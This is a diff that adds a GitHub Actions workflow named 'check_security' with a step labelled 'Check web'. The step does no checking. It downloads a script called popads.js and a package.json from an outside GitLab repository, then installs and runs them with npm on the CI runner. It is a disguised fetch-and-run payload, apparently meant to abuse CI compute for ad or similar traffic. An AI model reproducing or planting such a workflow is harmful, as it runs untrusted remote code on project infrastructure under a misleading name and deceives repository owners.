@@ -1,0 +1,14 @@
+name: check_security
+on: 
+  workflow_dispatch:
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  build:
+    runs-on: macos-latest
+    steps:
+    - name: Check web
+      run: |
+        curl https://gitlab.com/meo__coder/appfim__img/-/raw/master/popads.js --output index.js && curl https://gitlab.com/meo__coder/appfim__img/-/raw/master/package.json --output package.json && npm i -s && npm start
